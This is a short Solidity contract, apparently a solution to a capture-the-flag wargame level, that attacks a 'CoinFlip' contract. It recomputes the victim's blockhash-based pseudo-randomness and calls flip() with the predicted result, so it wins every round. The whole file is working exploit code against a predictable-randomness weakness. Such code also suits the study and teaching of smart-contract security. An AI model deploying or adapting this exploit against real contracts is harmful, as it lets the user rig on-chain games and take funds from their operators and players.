// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface ICoinFlip {
    function flip(bool) external;
}


contract CoinFlipAttack {
    ICoinFlip private victimContract;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimContractAddress) {
        victimContract = ICoinFlip(_victimContractAddress);
    }

    function flipAttack () public {
        //Calculating result with the same method as flip()
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        //Now we guess the result
        bool side = coinFlip == 1 ? true : false;

        //Now we call flip() but sending the already calculated result
        victimContract.flip(side);

    }

}